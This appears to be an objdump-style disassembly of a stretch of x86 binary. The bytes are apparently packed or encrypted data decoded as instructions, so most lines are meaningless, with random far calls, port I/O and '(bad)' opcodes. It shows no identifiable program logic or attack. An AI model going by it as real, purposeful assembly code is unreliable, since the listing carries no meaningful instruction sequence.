  42959d:	adc    dh,BYTE PTR [esp+ebx*1+0x6a]
  4295a1:	mov    al,ds:0x27ebe54e
  4295a6:	xor    edx,0x2
  4295a9:	jo     0x4295fa
  4295ab:	popf   
  4295ac:	and    DWORD PTR [ebx+0x64f53c58],0x27d5b5a7
  4295b6:	outs   dx,BYTE PTR ds:[esi]
  4295b7:	xor    ecx,edx
  4295b9:	push   esp
  4295ba:	jmp    0x8f8dc675
  4295bf:	sub    DWORD PTR [ebp-0xeac9f7b],edx
  4295c5:	das    
  4295c6:	xor    al,0x3
  4295c8:	rcl    BYTE PTR [ecx],1
  4295ca:	retf   
  4295cb:	fld    TBYTE PTR [eax]
  4295cd:	popf   
  4295ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4295cf:	jmpw   0xc98d
  4295d3:	mov    ?,WORD PTR [ebp+0x185b93ba]
  4295d9:	inc    ebp
  4295da:	in     eax,dx
  4295db:	mov    ebp,0xad39d0c8
  4295e0:	jne    0x4295ac
  4295e2:	cld    
  4295e3:	xchg   ecx,eax
  4295e4:	aas    
  4295e5:	sub    bl,BYTE PTR [edx+0x1a4dc3b6]
  4295eb:	in     al,0xa9
  4295ed:	sti    
  4295ee:	push   eax
  4295ef:	lods   al,BYTE PTR ds:[esi]
  4295f0:	jbe    0x42962b
  4295f2:	adc    BYTE PTR [eax-0x35f75ced],dl
  4295f8:	pop    esp
  4295f9:	(bad)  
  4295fa:	lods   al,BYTE PTR ds:[esi]
  4295fb:	mov    eax,ds:0xbf194482
  429600:	fst    QWORD PTR [ebx]
  429602:	loope  0x4295b2
  429604:	dec    esp
  429605:	scas   al,BYTE PTR es:[edi]
  429606:	dec    esp
  429607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429608:	mov    dl,0x9
  42960a:	call   0x47f4:0xae415b05
  429611:	pop    es
  429612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429613:	fdivrp st(5),st
  429615:	lods   al,BYTE PTR ds:[esi]
  429616:	icebp  
  429617:	sub    al,0x0
  429619:	js     0x4295a7
  42961b:	jbe    0x429660
  42961d:	cmp    dl,ah
  42961f:	fcmovnu st,st(0)
  429621:	ss mov ebp,0x64c5f42b
  429627:	(bad)  
  42962b:	pop    ebx
  42962c:	sub    BYTE PTR [ebx-0x7fe4f82e],al
  429632:	neg    DWORD PTR [edx-0x2dc1de22]
  429638:	daa    
  429639:	jmp    0x429664
  42963b:	mov    eax,ds:0xc3b3d7d4
  429640:	cmp    al,0xaf
	...
  4296b2:	add    BYTE PTR [eax],al
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	xor    eax,ebp
  4296c2:	cmp    bl,bh
  4296c4:	(bad)  
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [eax-0x755fb31b],ah
  4296d1:	inc    ebx
  4296d2:	sbb    DWORD PTR [eax+0xdeb7615],0x691b3aa1
  4296dc:	xor    esi,eax
  4296de:	cs test al,0x20
  4296e1:	out    0x68,eax
  4296e3:	cmp    bl,BYTE PTR [edi-0x77]
  4296e6:	dec    ebx
  4296e7:	sbb    eax,DWORD PTR [eax+0x13]
  4296ea:	or     al,0x87
  4296ed:	cld    
  4296ee:	sub    cl,BYTE PTR [eax-0x6dff24b5]
  4296f4:	test   al,0x6e
  4296f6:	pop    ebp
  4296f7:	stos   BYTE PTR es:[edi],al
  4296f8:	lea    ebp,[esi]
  4296fa:	dec    esp
  4296fb:	int3   
  4296fc:	popa   
  4296fd:	outs   dx,DWORD PTR ds:[esi]
  4296fe:	data16 and al,0x6
  429701:	pop    ebx
  429702:	push   ds
  429703:	adc    eax,0x17d21e08
  429708:	push   edx
  429709:	push   0x74
  42970b:	push   esi
  42970c:	aas    
  42970d:	ficom  WORD PTR [edi]
  42970f:	loope  0x429786
  429711:	cmp    ebp,DWORD PTR [edx+0x36]
  429714:	mov    dl,0x7d
  429716:	outs   dx,BYTE PTR ds:[esi]
  429717:	popa   
  429718:	and    eax,0xa7941bdc
  42971d:	dec    ebx
  42971e:	sub    BYTE PTR [edi-0x44c22546],0xad
  429725:	pop    ebp
  429726:	int3   
  429727:	sbb    ebp,DWORD PTR [esi-0x10f510c2]
  42972d:	xchg   esp,eax
  42972e:	or     DWORD PTR [edx-0x4],edi
  429731:	adc    BYTE PTR [ebp-0x59],dh
  429734:	cmp    ecx,DWORD PTR [ecx]
  429736:	cmp    al,0xe4
  429738:	int    0xc3
  42973a:	dec    ebx
  42973b:	imul   ebx,DWORD PTR [esi+0x51],0xfffffff6
  42973f:	dec    ecx
  429740:	daa    
  429741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429742:	push   edi
  429743:	stc    
  429744:	mov    gs,WORD PTR ds:0xc7f00ae9
  42974a:	sbb    al,0x1e
  42974c:	je     0x429727
  42974e:	mov    dl,0xe5
  429750:	xor    al,0x5f
  429752:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429753:	dec    esi
  429754:	les    esp,FWORD PTR [ebx]
  429756:	aas    
  429757:	and    BYTE PTR [eax-0x5],bh
  42975a:	push   ds
  42975b:	xchg   edi,eax
  42975c:	in     eax,0xb5
  42975e:	mov    dh,0x5d
  429760:	mov    al,0xb7
  429762:	mov    ebx,0xc1ed4685
  429767:	(bad)  
  429768:	mov    ebp,0x654c6c8f
  42976d:	cdq    
  42976e:	int    0xd1
  429770:	dec    esi
  429771:	inc    ebx
  429772:	push   ebp
  429773:	(bad)  
  429774:	in     eax,0x2a
  429776:	mov    dl,0x73
  429778:	rcl    ah,1
  42977a:	fisubr WORD PTR [ebp-0x56af23d3]
  429780:	mov    WORD PTR [esi+0x3b],cs
  429783:	daa    
  429784:	pop    ds
  429785:	pop    edi
  429786:	test   ah,al
  429788:	fucom  st(2)
  42978a:	pop    edx
  42978b:	(bad)  
  42978c:	and    eax,0x9fa3f0ff
  429791:	inc    esi
  429792:	out    0xbb,eax
  429794:	pop    edi
  429795:	pop    ebp
  429796:	repnz leave 
  429798:	ret    
  429799:	cmp    ah,BYTE PTR [eax-0x14]
  42979c:	sub    eax,DWORD PTR [ebx-0x3bda58ba]
  4297a2:	clc    
  4297a3:	dec    ebp
  4297a4:	sub    eax,0x460e7191
  4297a9:	push   ds
  4297aa:	jbe    0x429774
  4297ac:	int    0xa8
  4297ae:	sub    al,dl
  4297b0:	popf   
  4297b1:	xor    eax,0xc298bb56
  4297b6:	mov    sp,0x206f
  4297ba:	iret   
  4297bb:	iret   
  4297bc:	daa    
  4297bd:	dec    DWORD PTR [esi+0x3b]
  4297c0:	loopne 0x42981d
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    DWORD PTR [eax-0xbc65f5c],eax
  429845:	mov    eax,0xf60001
  42984a:	add    BYTE PTR [eax],al
  42984c:	cmc    
  42984d:	imul   edi,DWORD PTR [eax+0x4],0x3cd16ef2
  429854:	mov    eax,0xcc996d1f
  429859:	int    0x27
  42985b:	add    ecx,DWORD PTR [eax]
  42985d:	adc    DWORD PTR [ecx],ecx
  42985f:	dec    edx
  429860:	enter  0x6cce,0xc6
  429864:	sbb    DWORD PTR cs:[edi],esp
  429867:	xor    al,0xa9
  429869:	sahf   
  42986a:	(bad)  
  42986b:	cmp    eax,0xefebd40d
  429870:	adc    edx,DWORD PTR [ebp-0x2f]
  429873:	loop   0x429817
  429875:	cmp    eax,0xf1dbac4d
  42987a:	aam    0xbf
  42987c:	(bad)  
  42987d:	in     al,dx
  42987e:	in     eax,0x6f
  429880:	pop    ebx
  429881:	add    al,0x8a
  429883:	fist   WORD PTR ss:[edx-0x19a15457]
  42988a:	or     DWORD PTR [esi],ecx
  42988c:	retf   
  42988d:	pushf  
  42988e:	dec    esi
  42988f:	fs inc ecx
  429891:	in     al,dx
  429892:	mov    bh,0x25
  429894:	cli    
  429895:	mov    bl,0x64
  429897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429898:	fldcw  WORD PTR [ebx-0x5461e935]
  42989e:	lods   al,BYTE PTR ds:[esi]
  42989f:	push   es
  4298a0:	dec    ebx
  4298a1:	(bad)  
  4298a2:	pop    esi
  4298a3:	pop    es
  4298a4:	jne    0x42991d
  4298a6:	ret    
  4298a7:	jbe    0x429865
  4298a9:	push   cs
  4298aa:	sub    ch,BYTE PTR [ebp+0x173889e7]
  4298b0:	jne    0x429885
  4298b2:	lock add edi,DWORD PTR gs:[ebp+0x72c283dd]
  4298ba:	xor    al,0x29
  4298bc:	and    ecx,esp
  4298be:	fistp  WORD PTR [eax-0x5b]
  4298c1:	aad    0x4d
  4298c3:	push   cs
  4298c4:	cwde   
  4298c5:	dec    ebx
  4298c6:	pop    ds
  4298c7:	jmp    0x3298:0x23862eeb
  4298ce:	test   bh,ah
  4298d0:	fwait
  4298d1:	scas   al,BYTE PTR es:[edi]
  4298d2:	inc    edi
  4298d3:	sbb    DWORD PTR es:[esi+0x22f6c853],esp
  4298da:	push   es
  4298db:	scas   eax,DWORD PTR es:[edi]
  4298dc:	ret    
  4298dd:	int3   
  4298de:	test   DWORD PTR [edi+0x31ae7f12],esi
  4298e4:	sbb    DWORD PTR [ecx],0xffffffdd
  4298e7:	iret   
  4298e8:	inc    esp
  4298e9:	loope  0x42993a
  4298eb:	sar    BYTE PTR [ebp-0x23852a6],cl
  4298f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298f2:	sub    eax,0xb6772e04
  4298f7:	push   ds
  4298f8:	les    ebx,FWORD PTR [ecx+0x7a017a8a]
  4298fe:	mov    edx,esi
  429900:	into   
  429901:	and    ebp,DWORD PTR [esp+edi*2-0x3f26f820]
  429908:	push   ecx
  429909:	mov    edi,0x41ddc0f9
  42990e:	jnp    0x42992e
  429910:	rcl    edi,0xb5
  429913:	nop
  429914:	lods   al,BYTE PTR ds:[esi]
  429915:	adc    eax,ebp
  429917:	stc    
  429918:	inc    edx
  429919:	bound  edx,QWORD PTR [ecx-0x73]
  42991c:	aad    0xe9
  42991e:	test   dh,0x0
  429921:	aam    0x80
  429923:	mov    dh,BYTE PTR [edx+edx*8]
  429926:	pop    esi
  429927:	sbb    bh,BYTE PTR [esp+eiz*8]
  42992a:	repnz and esi,DWORD PTR [edx-0x5f]
  42992e:	(bad)  
  42992f:	je     0x4298f6
  429931:	ret    0x3d56
  429934:	and    ch,BYTE PTR [esi+0x96a817d]
  42993a:	fsub   QWORD PTR [ecx]
  42993d:	mov    dl,0x3f
  42993f:	ja     0x4298dd
  429941:	popa   
	...
  4299b2:	add    BYTE PTR [eax],al
  4299b4:	dec    ebp
  4299b5:	or     al,0xf8
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    esp,edi
  4299c1:	cs mov ch,0x6a
  4299c4:	jmp    0x0:0xf60001b9
  4299cb:	add    al,ah
  4299cd:	ror    dl,cl
  4299cf:	jae    0x42995d
  4299d1:	sub    al,0xfc
  4299d3:	or     BYTE PTR [eax-0x78],dh
  4299d6:	popa   
  4299d7:	xchg   DWORD PTR [eax-0xc],esp
  4299da:	push   ds
  4299db:	mov    ds:0xfec428b3,al
  4299e0:	push   ebx
  4299e1:	aas    
  4299e2:	fcomi  st,st(5)
  4299e4:	dec    ebp
  4299e5:	leave  
  4299e6:	and    BYTE PTR [ebx],0x27
  4299e9:	mov    al,ds:0x60fe6325
  4299ee:	in     eax,dx
  4299ef:	cmp    dh,bh
  4299f1:	in     eax,dx
  4299f2:	stos   BYTE PTR es:[edi],al
  4299f3:	je     0x429a4a
  4299f5:	jb     0x429a2f
  4299f7:	or     eax,0x95a7fcff
  4299fc:	das    
  4299fd:	test   DWORD PTR [ecx+0x47],ebx
  429a00:	pop    ecx
  429a01:	and    DWORD PTR [ebx],0x5b
  429a04:	inc    esp
  429a05:	mov    esp,0x8a1bc9fb
  429a0a:	xchg   DWORD PTR [ebx],eax
  429a0c:	xchg   ebp,eax
  429a0d:	ds je  0x429a5d
  429a10:	inc    eax
  429a11:	push   eax
  429a12:	scas   al,BYTE PTR es:[edi]
  429a13:	or     al,0x3a
  429a15:	add    dh,BYTE PTR [ecx]
  429a17:	adc    al,0x90
  429a19:	shl    eax,1
  429a1b:	mov    al,ds:0x36e23f0
  429a20:	mov    dh,0x96
  429a22:	and    BYTE PTR [eax+0x7ffe208a],ah
  429a28:	in     eax,dx
  429a29:	mov    ds:0x64a621ba,eax
  429a2e:	adc    dl,BYTE PTR [ecx]
  429a30:	in     eax,dx
  429a31:	test   al,0xa0
  429a33:	shr    esi,1
  429a35:	enter  0x596b,0x52
  429a39:	enter  0xae31,0x10
  429a3d:	and    edi,esp
  429a3f:	or     eax,0xbb07fcaa
  429a44:	sbb    eax,DWORD PTR [edi+0x73]
  429a47:	jmp    FWORD PTR [edx+ebx*4]
  429a4a:	inc    edx
  429a4b:	(bad)  
  429a4c:	in     al,0x2c
  429a4e:	(bad)  [edi]
  429a50:	retf   0x3544
  429a53:	sti    
  429a54:	adc    ebp,esp
  429a56:	jae    0x429a25
  429a58:	fisubr WORD PTR [edx+0xe]
  429a5b:	pop    edi
  429a5c:	jge    0x429ada
  429a5e:	xchg   ebx,eax
  429a5f:	bound  ecx,QWORD PTR [ebx]
  429a61:	mov    bh,0x7c
  429a63:	inc    ebx
  429a64:	clc    
  429a65:	inc    cx
  429a67:	inc    esp
  429a68:	add    al,BYTE PTR [edi-0x19cddf3b]
  429a6e:	mov    ah,cl
  429a70:	lahf   
  429a71:	ins    DWORD PTR es:[edi],dx
  429a72:	add    al,0x14
  429a74:	xor    eax,0xc91dfc95
  429a79:	adc    al,0x25
  429a7b:	sti    
  429a7c:	lahf   
  429a7d:	rol    DWORD PTR [ecx-0x6fb7035],0x89
  429a84:	lahf   
  429a85:	dec    ebx
  429a86:	aam    0x86
  429a88:	add    DWORD PTR [ebx+ebp*8+0x46],ebp
  429a8c:	lock inc esp
  429a8e:	pop    eax
  429a8f:	xchg   ecx,eax
  429a90:	fs nop
  429a92:	outs   dx,BYTE PTR ds:[esi]
  429a93:	xlat   BYTE PTR ds:[ebx]
  429a94:	mov    edi,0x37192daf
  429a99:	mov    dh,0x6a
  429a9b:	mov    ebp,0xdc0a6229
  429aa0:	jns    0x429b07
  429aa2:	sub    DWORD PTR [edi-0x2b],edx
  429aa5:	pop    ss
  429aa6:	mov    eax,0xd432437c
  429aab:	add    eax,0x9e98faa9
  429ab0:	push   ss
  429ab1:	pop    ebp
  429ab2:	int3   
  429ab3:	xchg   esi,eax
  429ab4:	aas    
  429ab5:	(bad)  
  429ab6:	push   edi
  429ab7:	out    dx,eax
  429ab8:	mov    bl,0x13
  429aba:	or     BYTE PTR [edi-0x2e],cl
  429abd:	lahf   
  429abe:	fnstsw WORD PTR [eax*8+0x84]
	...
  429b31:	add    BYTE PTR [eax],al
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x1e2f
  429b42:	adc    edx,DWORD PTR [edi+0x1bae0]
  429b48:	test   BYTE PTR [eax],0x0
  429b4b:	add    BYTE PTR [ebx+0x1d],bl
  429b4e:	outs   dx,DWORD PTR ds:[esi]
  429b4f:	fdiv   QWORD PTR [eax*4-0x79255bc7]
  429b56:	xor    al,BYTE PTR [ebx]
  429b58:	ins    BYTE PTR es:[edi],dx
  429b59:	inc    eax
  429b5a:	sbb    bl,BYTE PTR [edx+0x67dd3e1a]
  429b60:	pop    ebx
  429b61:	push   edi
  429b62:	stos   BYTE PTR es:[edi],al
  429b63:	push   edx
  429b64:	sbb    ch,BYTE PTR [si-0x25]
  429b68:	mov    esp,esi
  429b6a:	or     ecx,DWORD PTR [edi]
  429b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b6d:	and    DWORD PTR [ecx-0xc],0x2a4a76b2
  429b74:	mov    edi,0xe6acd38e
  429b79:	sub    BYTE PTR [edi+0x34],cl
  429b7c:	xchg   edx,eax
  429b7d:	ins    DWORD PTR es:[edi],dx
  429b7e:	cmp    BYTE PTR [ebx],0x27
  429b81:	inc    eax
  429b82:	push   cs
  429b83:	jb     0x429bb3
  429b85:	outs   dx,DWORD PTR ds:[esi]
  429b86:	mov    eax,ds:0xb20de3c0
  429b8b:	gs push ecx
  429b8d:	push   es
  429b8e:	mov    bh,0xe3
  429b90:	add    ah,BYTE PTR [ecx+0x11]
  429b93:	es cmc 
  429b95:	xor    BYTE PTR [eax+esi*2-0x3fa46eda],cl
  429b9c:	arpl   WORD PTR [esi-0x100561e3],ax
  429ba2:	ins    BYTE PTR es:[edi],dx
  429ba3:	add    DWORD PTR [ecx+0x72],ebx
  429ba6:	xchg   ecx,eax
  429ba7:	imul   esp,DWORD PTR [edx+ebp*8+0x25],0xb3140b0f
  429baf:	dec    edx
  429bb0:	lock or eax,0x8fe3967b
  429bb6:	call   0xc7df:0x94f79031
  429bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429bbe:	push   ebx
  429bbf:	scas   al,BYTE PTR es:[edi]
  429bc0:	dec    ecx
  429bc1:	xor    al,0x31
  429bc3:	je     0x429c24
  429bc5:	nop
  429bc6:	outs   dx,BYTE PTR ds:[esi]
  429bc7:	jno    0x429b6e
  429bc9:	add    bl,bl
  429bcb:	pop    es
  429bcc:	xor    al,dh
  429bce:	test   al,0xd5
  429bd0:	sbb    al,0x22
  429bd2:	popa   
  429bd3:	inc    ebp
  429bd4:	(bad)  
  429bd5:	daa    
  429bd6:	lahf   
  429bd7:	mov    edx,0x48f7cfea
  429bdc:	adc    cl,dl
  429bde:	inc    eax
  429bdf:	push   esp
  429be0:	cld    
  429be1:	int    0x88
  429be3:	pop    es
  429be4:	mov    esi,0xc10896a8
  429be9:	in     al,dx
  429bea:	xor    DWORD PTR [eax+ecx*2+0x1b124275],eax
  429bf1:	test   BYTE PTR [edi],0xee
  429bf4:	cs std 
  429bf6:	xlat   BYTE PTR ds:[ebx]
  429bf7:	push   0xdbbea29d
  429bfc:	fild   QWORD PTR [ebp+0x25]
  429bff:	dec    ecx
  429c00:	loopne 0x429c4d
  429c02:	push   es
  429c03:	inc    edx
  429c04:	push   ebx
  429c05:	xchg   esp,eax
  429c06:	lods   eax,DWORD PTR ds:[esi]
  429c07:	mov    esp,0xd3360678
  429c0c:	je     0x429c06
  429c0e:	or     esi,0xffffffc6
  429c11:	out    dx,al
  429c12:	(bad)  [ecx-0x3f]
  429c15:	frstor [edi-0x50]
  429c18:	sub    eax,0xaf935b17
  429c1d:	sub    al,0x7f
  429c1f:	pop    eax
  429c20:	ds sub al,0x2c
  429c23:	push   esi
  429c24:	stos   DWORD PTR es:[edi],eax
  429c25:	(bad)  
  429c26:	push   edi
  429c27:	mov    cs,WORD PTR ds:0x24b179ba
  429c2d:	pop    edi
  429c2e:	sbb    cl,BYTE PTR [ecx+0x14ff6ae7]
  429c34:	mul    DWORD PTR [edx]
  429c36:	jb     0x429bd8
  429c38:	(bad)  [esi+ebx*4]
  429c3b:	mov    bl,0x2f
  429c3d:	jnp    0x429c3c
  429c3f:	adc    DWORD PTR [ecx],0xffffffe3
	...
  429cb2:	add    BYTE PTR [eax],al
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	pop    es
  429cc1:	test   eax,0xbbd6e23f
  429cc6:	add    DWORD PTR [eax],eax
  429cc8:	test   BYTE PTR [eax],0x0
  429ccb:	add    BYTE PTR [esp+ebx*2-0x50],cl
  429ccf:	xlat   BYTE PTR ds:[ebx]
  429cd0:	sbb    DWORD PTR [ebx],0xffffff8c
  429cd3:	ss cli 
  429cd5:	data16 js 0x429d00
  429cd8:	std    
  429cd9:	cld    
  429cda:	xor    DWORD PTR [eax-0x26],ebp
  429cdd:	popa   
  429cde:	cld    
  429cdf:	lahf   
  429ce0:	add    BYTE PTR [edi+0x694edb12],ch
  429ce6:	(bad)  [edi+0x6c]
  429ce9:	aaa    
  429cea:	ss int 0x45
  429ced:	(bad)  
  429cee:	leave  
  429cef:	inc    esi
  429cf0:	mov    cl,BYTE PTR [ebp-0x1]
  429cf3:	mov    gs,WORD PTR [ecx-0x33]
  429cf6:	ins    BYTE PTR es:[edi],dx
  429cf7:	imul   edx,DWORD PTR [esi],0x4
  429cfa:	out    dx,al
  429cfb:	fcomip st,st(5)
  429cfd:	iret   
  429cfe:	and    DWORD PTR ds:0x21235a63,ecx
  429d04:	gs push esp
  429d06:	pop    ecx
  429d07:	add    eax,0x639a62b7
  429d0c:	ror    BYTE PTR [ebp-0x56],cl
  429d0f:	ins    BYTE PTR es:[edi],dx
  429d10:	sbb    dl,BYTE PTR [eax+0x547eeb29]
  429d16:	inc    esi
  429d17:	inc    esp
  429d18:	aas    
  429d19:	xor    esi,ebx
  429d1b:	mov    eax,ds:0xd0302055
  429d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d21:	ret    
  429d22:	xor    al,0x46
  429d24:	mov    esp,0xa1740db3
  429d29:	icebp  
  429d2a:	cld    
  429d2b:	sub    BYTE PTR [ebp-0x80],al
  429d2e:	pop    esi
  429d2f:	mov    DWORD PTR [ebx],esi
  429d31:	test   BYTE PTR [ebx],0x82
  429d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d35:	mov    ecx,0xd8cef79c
  429d3a:	ret    0xabec
  429d3d:	ficomp WORD PTR ds:0x20a63aae
  429d43:	xchg   edx,eax
  429d44:	dec    ebp
  429d45:	hlt    
  429d46:	pop    edi
  429d47:	sub    BYTE PTR [ebp+0x7f],0x8
  429d4b:	(bad)  
  429d4c:	push   ecx
  429d4d:	call   0xb3a6:0x5886f5c1
  429d54:	test   DWORD PTR [esi],ecx
  429d56:	call   0xc06d:0x33fde184
  429d5d:	iret   
  429d5e:	ss imul ebx,ecx,0x3f
  429d62:	cmc    
  429d63:	push   esp
  429d64:	push   ebx
  429d65:	ja     0x429db4
  429d67:	iret   
  429d68:	ret    
  429d69:	xor    dl,ch
  429d6b:	xor    eax,0x209ea036
  429d70:	fimul  WORD PTR [esi+0x4c]
  429d73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d74:	or     eax,0x5bf5331c
  429d79:	push   eax
  429d7a:	inc    edi
  429d7b:	inc    esi
  429d7c:	adc    dh,ch
  429d7e:	mov    cl,BYTE PTR [eax-0x2847a310]
  429d84:	adc    ecx,DWORD PTR [edx]
  429d86:	cmp    al,0x7a
  429d88:	push   ecx
  429d89:	sbb    al,0x8e
  429d8b:	dec    ecx
  429d8c:	xchg   ecx,eax
  429d8d:	or     ebp,DWORD PTR [edi]
  429d8f:	mov    edi,0xa2757c71
  429d94:	adc    eax,0x38416ba0
  429d99:	popa   
  429d9a:	shl    DWORD PTR [ebp-0x75e294c3],cl
  429da0:	pop    ecx
  429da1:	mov    fs,WORD PTR [edx+ebx*1-0x3a6796e2]
  429da8:	xchg   edx,eax
  429da9:	fiadd  WORD PTR ds:0xaf6b9221
  429daf:	mov    WORD PTR [edi-0xb3f88aa],fs
  429db5:	rcl    DWORD PTR [edx-0x1445d19f],1
  429dbb:	scas   eax,DWORD PTR es:[edi]
  429dbc:	jmp    0x429d51
  429dbe:	mov    ch,0xd6
  429dc0:	dec    ecx
  429dc1:	or     eax,DWORD PTR [eax]
	...
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax+0x404e2ee0]
  429e41:	paddsb mm3,QWORD PTR [ebx-0x34]
  429e45:	mov    esp,0xf60001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	or     al,0xaa
  429e4e:	popf   
  429e4f:	jecxz  0x429e56
  429e51:	std    
  429e52:	jmp    0x287d97dc
  429e57:	(bad)  
  429e58:	outs   dx,BYTE PTR ds:[esi]
  429e59:	push   ss
  429e5a:	mov    esp,0x9636e213
  429e5f:	jecxz  0x429e12
  429e61:	out    0x71,eax
  429e63:	cmp    ebp,edx
  429e65:	mov    BYTE PTR [eax-0x4cd386ee],dl
  429e6b:	sbb    eax,0xe5d92dca
  429e70:	clc    
  429e71:	popf   
  429e72:	jecxz  0x429ec4
  429e74:	xchg   esp,eax
  429e75:	dec    ecx
  429e76:	add    al,0xeb
  429e78:	add    eax,0xfe6c64a7
  429e7d:	shr    bh,0x96
  429e80:	(bad)  
  429e81:	ficom  WORD PTR [edx+ebp*1-0x347fb204]
  429e88:	mov    bl,0x13
  429e8a:	arpl   WORD PTR [ebx+0x1f2ab882],si
  429e90:	push   esi
  429e91:	aaa    
  429e92:	les    ebx,FWORD PTR [edi-0x6c]
  429e95:	inc    esi
  429e96:	mov    ebx,0x11b0220d
  429e9b:	leave  
  429e9c:	mov    edi,0x91ec92ce
  429ea1:	and    DWORD PTR [esp+edx*4-0x33],esi
  429ea5:	pop    ds
  429ea6:	dec    edx
  429ea7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ea8:	scas   al,BYTE PTR es:[edi]
  429ea9:	imul   ecx,ecx,0xffffff92
  429eac:	xor    DWORD PTR [esi],edi
  429eae:	std    
  429eaf:	adc    edi,esp
  429eb1:	mov    dl,0x1d
  429eb3:	(bad)  
  429eb4:	jl     0x429e4a
  429eb6:	push   0xf9524fee
  429ebb:	popa   
  429ebc:	adc    eax,0xfcacccf3
  429ec1:	or     eax,0x30513d80
  429ec6:	pop    eax
  429ec7:	popa   
  429ec8:	fnop   
  429eca:	(bad)  
  429ecb:	mov    eax,0xe6cc36fe
  429ed0:	sbb    esp,DWORD PTR [ecx+0x76]
  429ed3:	fs cmp ah,0xd9
  429ed7:	or     BYTE PTR [edi-0x5a],dh
  429eda:	sbb    cl,dh
  429edc:	ret    0xdbec
  429edf:	ror    DWORD PTR [edi],cl
  429ee1:	adc    eax,0x91f6a412
  429ee6:	mov    esp,edi
  429ee8:	mov    ebx,0x7dfc594a
  429eed:	push   esi
  429eee:	or     DWORD PTR [ebx],ecx
  429ef0:	add    edx,ecx
  429ef2:	jbe    0x429efb
  429ef4:	push   ds
  429ef5:	dec    ecx
  429ef6:	mov    cl,0x60
  429ef8:	cmp    DWORD PTR [edx],esp
  429efa:	shl    esp,cl
  429efc:	push   ecx
  429efd:	aam    0x1
  429eff:	mov    ah,0xad
  429f01:	gs and al,0xd5
  429f04:	push   ebp
  429f05:	xor    DWORD PTR [edx+0x29],edx
  429f08:	neg    BYTE PTR [esi]
  429f0a:	fsub   QWORD PTR [esi+0x12]
  429f0d:	mov    edx,0x22ee0636
  429f12:	pusha  
  429f13:	fnsave [ebp+eax*8-0x137f522b]
  429f1a:	mov    eax,ds:0xc040c313
  429f1f:	fidivr DWORD PTR [eax-0x6b1ad09f]
  429f25:	rcl    DWORD PTR [edx-0xb],1
  429f28:	pusha  
  429f29:	xchg   esi,eax
  429f2a:	jle    0x429f5d
  429f2c:	mul    DWORD PTR [ebp+edi*2-0x43ac441c]
  429f33:	add    eax,0xbe91ced7
  429f38:	stc    
  429f39:	xchg   edx,eax
  429f3a:	rcr    dh,1
  429f3c:	shr    DWORD PTR [edx],cl
  429f3e:	cmc    
  429f3f:	nop
  429f40:	push   0x17
	...
  429fb2:	add    BYTE PTR [eax],al
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x3f3c6d7b]
  429fc2:	outs   dx,DWORD PTR ds:[esi]
  429fc3:	xchg   dl,al
  429fc5:	mov    ebp,0xf60001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	test   al,0xf5
  429fce:	sbb    ecx,DWORD PTR [ecx+0x7728f58f]
  429fd4:	add    ebp,DWORD PTR [edx]
  429fd6:	jb     0x42a019
  429fd8:	ss push 0xffffff80
  429fdb:	push   es
  429fdc:	scas   al,BYTE PTR es:[edi]
  429fdd:	jg     0x42a02e
  429fdf:	adc    BYTE PTR [ebx-0x59],0xec
  429fe3:	ret    0x40d6
  429fe6:	sar    DWORD PTR [edi-0x1e768936],0x6
  429fed:	in     al,dx
  429fee:	shl    DWORD PTR [edi+0x7],cl
  429ff1:	add    bh,bl
  429ff3:	mov    DWORD PTR [edi],eax
  429ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429ff6:	cmp    ebx,ecx
  429ff8:	dec    edx
  429ff9:	out    0x54,eax
  429ffb:	dec    ebp
  429ffc:	mov    gs,edi
  429ffe:	hlt    
  429fff:	call   DWORD PTR fs:[esi]
  42a002:	jecxz  0x42a01b
  42a004:	retf   
  42a005:	hlt    
  42a006:	xchg   esi,eax
  42a007:	xlat   BYTE PTR ds:[ebx]
  42a008:	std    
  42a009:	mov    bl,0x6d
  42a00b:	mov    bh,0x7b
  42a00d:	xchg   ebp,eax
  42a00e:	jns    0x429ff4
  42a010:	retf   
  42a011:	adc    eax,0xd62259cf
  42a016:	inc    ebx
  42a017:	dec    edi
  42a018:	lea    ebp,[ebx+ecx*2]
  42a01b:	aad    0xc6
